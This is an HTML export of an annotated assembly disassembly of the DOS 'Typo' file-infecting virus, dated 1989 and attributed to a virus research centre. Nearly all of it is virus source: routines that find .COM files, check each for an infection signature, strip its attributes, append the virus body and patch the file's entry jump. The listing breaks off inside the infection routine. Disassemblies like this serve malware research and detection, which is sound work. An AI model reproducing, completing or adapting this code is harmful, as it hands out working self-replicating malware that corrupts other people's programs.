<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">    </span><span class="sc9">page</span><span class="sc0">    </span><span class="sc2">65</span><span class="sc4">,</span><span class="sc2">132</span><span class="sc0">
    </span><span class="sc9">title</span><span class="sc0">   </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc12">'Typo'</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0">
</span><span class="sc1">; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป</span><span class="sc0">
</span><span class="sc1">; บ                 British Computer Virus Research Centre                   บ</span><span class="sc0">
</span><span class="sc1">; บ  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    บ</span><span class="sc0">
</span><span class="sc1">; บ  Telephone:     Domestic   0273-26105,   International  +44-273-26105    บ</span><span class="sc0">
</span><span class="sc1">; บ                                                                          บ</span><span class="sc0">
</span><span class="sc1">; บ                           The 'Typo' Virus                               บ</span><span class="sc0">
</span><span class="sc1">; บ                Disassembled by Joe Hirst,      October 1989              บ</span><span class="sc0">
</span><span class="sc1">; บ                                                                          บ</span><span class="sc0">
</span><span class="sc1">; บ                      Copyright (c) Joe Hirst 1989.                       บ</span><span class="sc0">
</span><span class="sc1">; บ                                                                          บ</span><span class="sc0">
</span><span class="sc1">; บ      This listing is only to be made available to virus researchers      บ</span><span class="sc0">
</span><span class="sc1">; บ                or software writers on a need-to-know basis.              บ</span><span class="sc0">
</span><span class="sc1">; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ</span><span class="sc0">

</span><span class="sc5">VECTOR</span><span class="sc0">  </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc9">AT</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc1">; Interrupt vectors</span><span class="sc0">

    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">58H</span><span class="sc0">
</span><span class="sc5">BW0058</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Interrupt 16H offset</span><span class="sc0">
</span><span class="sc5">BW005A</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Interrupt 16H segment</span><span class="sc0">
    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">80H</span><span class="sc0">
</span><span class="sc5">BW0080</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Interrupt 20H offset</span><span class="sc0">
</span><span class="sc5">BW0082</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Interrupt 20H segment</span><span class="sc0">
</span><span class="sc5">BW0084</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Interrupt 21H offset</span><span class="sc0">
</span><span class="sc5">BW0086</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Interrupt 21H segment</span><span class="sc0">

</span><span class="sc5">VECTOR</span><span class="sc0">  </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">RAM</span><span class="sc0"> </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc9">AT</span><span class="sc0"> </span><span class="sc2">400H</span><span class="sc0">

    </span><span class="sc1">; System data</span><span class="sc0">

    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">6CH</span><span class="sc0">
</span><span class="sc5">BW046C</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; System clock</span><span class="sc0">

</span><span class="sc5">RAM</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">HOST</span><span class="sc0">    </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc9">AT</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">2CH</span><span class="sc0">
</span><span class="sc5">DW002C</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">0D0H</span><span class="sc0">
</span><span class="sc5">DW00D0</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0">
</span><span class="sc5">DB00D0</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">100H</span><span class="sc0">
</span><span class="sc5">DB0100</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DW0101</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">HOST</span><span class="sc0">    </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">CODE</span><span class="sc0">    </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">

    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">HOST</span><span class="sc0">

    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'V1'</span><span class="sc0">            </span><span class="sc1">; Signature</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0E9H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; Jump for start of host</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'*.COM'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; File spec for infection</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0CEH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20H</span><span class="sc0">     </span><span class="sc1">; File start read buffer</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'V1'</span><span class="sc0">            </span><span class="sc1">; Signature test read buffer</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc0">           </span><span class="sc1">; File handle</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90H</span><span class="sc0">      </span><span class="sc1">; Start of host</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">5AH</span><span class="sc0">         </span><span class="sc1">; Generation count</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc1">; Entry point</span><span class="sc0">

</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0024</span><span class="sc0">          </span><span class="sc1">; \ Get current address</span><span class="sc0">
</span><span class="sc5">BP0024</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">24H</span><span class="sc0">          </span><span class="sc1">; Relocate from start of virus</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">16H</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Subtract from generation count</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">16H</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; Is generation count three?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0036</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">16H</span><span class="sc4">],</span><span class="sc2">005BH</span><span class="sc0"> </span><span class="sc1">; Reset generation count to 91</span><span class="sc0">
</span><span class="sc5">BP0036</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP02BE</span><span class="sc0">          </span><span class="sc1">; Test system for infection</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">00D0H</span><span class="sc0">        </span><span class="sc1">; Temp default DTA</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">1AH</span><span class="sc0">          </span><span class="sc1">; Set DTA function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0BH</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; \ Save start of host (1)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">12H</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">     </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0CH</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; \ Save start of host (2)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">13H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">     </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2AH</span><span class="sc0">          </span><span class="sc1">; Get date function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; First of month?</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">BP0074</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address '*.COM'</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; No attributes</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4EH</span><span class="sc0">          </span><span class="sc1">; Find first file function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0074</span><span class="sc0">          </span><span class="sc1">; Branch if not found</span><span class="sc0">
</span><span class="sc5">BP0063</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0092</span><span class="sc0">          </span><span class="sc1">; Test for infection</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address '*.COM'</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; No attributes</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4FH</span><span class="sc0">          </span><span class="sc1">; Find next file function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">BP0063</span><span class="sc0">          </span><span class="sc1">; Branch if found</span><span class="sc0">
</span><span class="sc5">BP0074</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">12H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; \ Restore start of host (1)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DB0100</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">       </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">13H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; \ Restore start of host (2)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DW0101</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0080H</span><span class="sc0">        </span><span class="sc1">; Original default DTA</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">1AH</span><span class="sc0">          </span><span class="sc1">; Set DTA function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0100H</span><span class="sc0">        </span><span class="sc1">; \ Branch to start of host</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">

    </span><span class="sc1">; Test for infection in COM file</span><span class="sc0">

</span><span class="sc5">BP0092</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301H</span><span class="sc0">        </span><span class="sc1">; Set file attributes function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DB00D0</span><span class="sc4">+</span><span class="sc2">1EH</span><span class="sc0">    </span><span class="sc1">; Address file path in DTA</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; No attributes</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3D02H</span><span class="sc0">        </span><span class="sc1">; Open handle (R/W) function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DB00D0</span><span class="sc4">+</span><span class="sc2">1EH</span><span class="sc0">    </span><span class="sc1">; Address file path in DTA</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">BP00A9</span><span class="sc0">          </span><span class="sc1">; Branch if no error</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP015D</span><span class="sc0">          </span><span class="sc1">; Return</span><span class="sc0">

</span><span class="sc5">BP00A9</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">10H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">     </span><span class="sc1">; Save file handle</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; Move file handle</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">          </span><span class="sc1">; Read handle function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Length to read</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address start-of-host store</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">000BH</span><span class="sc0">        </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0BH</span><span class="sc4">],</span><span class="sc2">0E9H</span><span class="sc0">  </span><span class="sc1">; Is it a jump?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP00F1</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0CH</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; \ </span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">16H</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; No high offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">        </span><span class="sc1">; Move file pointer function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">10H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get file handle</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; Move actual offset (? not used)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">          </span><span class="sc1">; Read handle function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; Length to read</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address signature test buffer</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">000EH</span><span class="sc0">        </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">10H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get file handle</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP014A</span><span class="sc0">          </span><span class="sc1">; Branch if error</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Did we read anything?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP00F1</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0EH</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get signature test</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Is it signature?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP014A</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
</span><span class="sc5">BP00F1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; \ No offset</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4202H</span><span class="sc0">        </span><span class="sc1">; Move file pointer function (EOF)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">10H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get file handle</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP014A</span><span class="sc0">          </span><span class="sc1">; Branch if error</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Convert length to jump offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Store in jump</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">10H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get file handle</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">          </span><span class="sc1">; Write handle function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc0">    </span><span class="sc1">; Length of virus</span><span class="sc0">
    </span><span class="sc6">NOP</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address start of virus</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP014A</span><span class="sc0">          </span><span class="sc1">; Branch if error</span><span class="sc0">
